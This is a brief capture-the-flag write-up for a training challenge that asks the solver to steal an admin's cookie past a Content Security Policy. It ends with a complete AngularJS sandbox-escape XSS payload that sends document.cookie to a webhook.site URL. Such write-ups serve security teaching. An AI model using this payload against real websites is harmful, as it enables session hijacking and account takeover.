------ CHALLENGE ------
Steal the admin's cookie on this website: http://csp.training.ctf.necst.it/

The admin will visit the pages you report using this form: http://checker.training.ctf.necst.it/checker.php. Pay attention to pick the right challenge in the dropdown.

------ EXPLOIT ------
We need a site where to redirect requests, we can use: https://webhook.site/
 - The provided requestbin doesn't work, so use that instead

So the idea is to send the admins cookie as a param when making a request to
our webhook site.
 - Admins cookie: document.cookie
 - We need the admin to execute a request to
   'https://webhook.site/<webhook-personal-code>?cookie=' + document.cookie

Javascript is disabled and we cannot load it through <script src="..."></script>
We can, however, load google stuff, including angularjs

Here are some xss examples in angular:
    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md
    - We can use {{constructor.constructor('alert(1)')()}}

We can inject a div with the code in ng-init, which executes when the page loads.

<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
<div ng-app ng-init="constructor.constructor('window.location.href = \'https://webhook.site/2cc9dda3-cf81-4721-b3c2-28bdb72bbce3?cookie=\' + document.cookie')()">test</div>
